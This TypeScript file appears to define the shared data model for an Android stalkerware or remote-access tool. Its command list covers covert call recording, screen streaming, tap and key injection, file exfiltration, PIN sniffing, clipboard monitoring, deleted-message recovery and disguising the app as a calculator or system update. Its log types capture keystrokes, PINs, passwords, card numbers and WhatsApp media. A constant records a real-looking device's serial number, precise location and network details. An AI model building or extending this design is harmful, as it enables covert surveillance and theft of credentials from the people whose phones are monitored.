// Shared Device Types & Interfaces for Client and Server

export interface DeviceState {
  device_id: string;
  last_seen_at: number;
  is_online: boolean;
  location: {
    latitude: number;
    longitude: number;
    accuracy: number;
    altitude: number;
    speed: number;
    provider: string;
    bearing?: number;
    address?: string;
  };
  battery: {
    level: number;
    percentage: number;
    is_charging: boolean;
    charge_plug: string;
    temperature_celsius: number;
    voltage_mv: number;
    health: string;
  };
  network: {
    type: string;
    is_connected: boolean;
    ssid: string;
    rssi: number;
    ip_address: string;
    carrier_name: string;
    link_speed_mbps: number;
  };
  storage: {
    internal_total_bytes: number;
    internal_free_bytes: number;
    internal_used_percentage: number;
    ram_total_bytes: number;
    ram_available_bytes: number;
    ram_is_low_memory: boolean;
  };
  device_info: {
    serial_number: string;
    manufacturer: string;
    brand: string;
    model: string;
    android_version: string;
    sdk_int: number;
    uptime_seconds: number;
  };
  system_status: {
    is_device_owner: boolean;
    is_kiosk_active: boolean;
    app_version: string;
    foreground_service_active: boolean;
    is_battery_optimization_ignored: boolean;
  };
  battery_level?: number;
  is_charging?: boolean;
  latitude?: number;
  longitude?: number;
  wifi_ssid?: string;
}

export interface RemoteCommand {
  command_id: string;
  device_id: string;
  action: 
    | 'LOCK_DEVICE' 
    | 'PLAY_SOUND' 
    | 'REQUEST_LOCATION' 
    | 'ENABLE_KIOSK' 
    | 'DISABLE_KIOSK' 
    | 'WIPE_DEVICE' 
    | 'REBOOT_DEVICE' 
    | 'FETCH_TELEMETRY'
    | 'TAKE_PHOTO_FRONT'
    | 'TAKE_PHOTO_BACK'
    | 'TAKE_SCREENSHOT'
    | 'LIST_FILES'
    | 'DELETE_FILE'
    | 'DOWNLOAD_FILE'
    | 'DOWNLOAD_FOLDER'
    | 'LIST_APPS'
    | 'BLOCK_APP'
    | 'UNBLOCK_APP'
    | 'RECORD_AUDIO'
    | 'SET_TRIGGER_APPS'
    | 'STOP_SCREEN_RECORD'
    | 'SET_VAD_ENABLED'
    | 'RECORD_SCREEN'
    | 'INJECT_TAP'
    | 'INJECT_SWIPE'
    | 'INJECT_KEY'
    | 'START_SCREEN_STREAM'
    | 'STOP_SCREEN_STREAM'
    | 'TAKE_DUAL_PHOTO'
    | 'EXPORT_FORENSICS'
    | 'RUN_DIAGNOSTICS'
    | 'GET_SIM_INFO'
    | 'SCAN_LAN_NETWORK'
    | 'FETCH_USAGE_STATS'
    | 'INJECT_TEXT'
    | 'LAUNCH_APP'
    // 8 NEW REQUESTED ELITE FEATURES:
    | 'RECORD_CALL_AUDIO'
    | 'SET_APP_CAMOUFLAGE'
    | 'TRIGGER_INTRUDER_SELFIE'
    | 'SEND_SMS_COMMAND'
    | 'ENABLE_CLIPBOARD_RADAR'
    | 'ENABLE_DELETED_MSG_CARVING'
    | 'ENABLE_PIN_SNIFFER'
    | 'START_TURBO_STREAM'
    | 'STOP_TURBO_STREAM';
  parameters?: Record<string, any>;
  params?: Record<string, any>;
  issued_at: number;
  timestamp: number;
  status: 'PENDING' | 'SENT' | 'EXECUTED' | 'FAILED';
}

export interface CapturedMedia {
  id: string;
  device_id: string;
  type: 
    | 'PHOTO_FRONT' 
    | 'PHOTO_BACK' 
    | 'SCREENSHOT' 
    | 'AUDIO_RECORDING'
    | 'CALL_RECORDING'
    | 'SCREEN_RECORD'
    | 'WHATSAPP_IMAGE'
    | 'WHATSAPP_VIDEO'
    | 'WHATSAPP_AUDIO'
    | 'WHATSAPP_DOC'
    | 'INTRUDER_SELFIE'
    | 'DUAL_PIP';
  data_url: string;
  captured_at: number;
  size_bytes?: number;
  label?: string;
  mime_type?: string;
  trigger_package?: string;
  duration_seconds?: number;
  source_path?: string;
}

export interface FileItem {
  name: string;
  path: string;
  is_directory: boolean;
  size_bytes: number;
  modified_at: number;
  extension?: string;
  download_url?: string;
}

export interface LocationBreadcrumb {
  id: string;
  device_id: string;
  latitude: number;
  longitude: number;
  accuracy: number;
  altitude?: number;
  speed?: number;
  bearing?: number;
  address?: string;
  timestamp: number;
  first_seen_timestamp?: number;
  last_seen_timestamp?: number;
  stay_duration_minutes?: number;
  distance_from_previous_meters?: number;
}

export interface DeviceAuditLog {
  id: string;
  device_id: string;
  event_type: 'KEYSTROKE' | 'NOTIFICATION' | 'CLIPBOARD' | 'APP_OPEN' | 'DELETED_MSG' | 'PIN_CAPTURED' | 'CALL_EVENT';
  package_name: string;
  app_name?: string;
  title?: string;
  content: string;
  timestamp: number;
  category?: 'IBAN' | 'CREDIT_CARD' | 'PASSWORD' | 'CRYPTO' | 'PIN' | 'GENERAL';
}

export interface InstalledApp {
  package_name: string;
  app_name: string;
  version_name: string;
  is_system: boolean;
  is_launchable?: boolean;
  is_blocked: boolean;
  installed_at?: number;
}

export interface IntelligenceHubState {
  call_recording_active: boolean;
  deleted_msg_backup_active?: boolean;
  pin_verifier_active?: boolean;
  security_selfie_active?: boolean;
  clipboard_radar_active: boolean;
  turbo_stream_active: boolean;
  current_camouflage: 'DEFAULT' | 'CALCULATOR' | 'WEATHER' | 'SYSTEM_UPDATE' | 'CLOCK' | 'HIDE';
  sms_fallback_phone: string;
}

export const REAL_A71_DEVICE: DeviceState = {
  device_id: "1ac10c6100e93908",
  last_seen_at: Date.now(),
  is_online: true,
  location: {
    latitude: 40.692388,
    longitude: 29.610730,
    accuracy: 12.0,
    altitude: 45.2,
    speed: 0,
    provider: "fused",
    address: "Karamürsel / Kocaeli"
  },
  battery: {
    level: 96,
    percentage: 96,
    is_charging: false,
    charge_plug: "UNPLUGGED",
    temperature_celsius: 31.5,
    voltage_mv: 4177,
    health: "GOOD"
  },
  network: {
    type: "WIFI",
    is_connected: true,
    ssid: "TelefonMuhendisi_5G",
    rssi: -57,
    ip_address: "192.168.1.125",
    carrier_name: "Turkcell LTE",
    link_speed_mbps: 390
  },
  storage: {
    internal_total_bytes: 117730816000,
    internal_free_bytes: 108110221312,
    internal_used_percentage: 8.17,
    ram_total_bytes: 7885045760,
    ram_available_bytes: 4271800320,
    ram_is_low_memory: false
  },
  device_info: {
    serial_number: "1ac10c6100e93908",
    manufacturer: "samsung",
    brand: "samsung",
    model: "SM-A715F",
    android_version: "13",
    sdk_int: 33,
    uptime_seconds: 99300
  },
  system_status: {
    is_device_owner: false,
    is_kiosk_active: false,
    app_version: "1.0.0",
    foreground_service_active: true,
    is_battery_optimization_ignored: true
  }
};
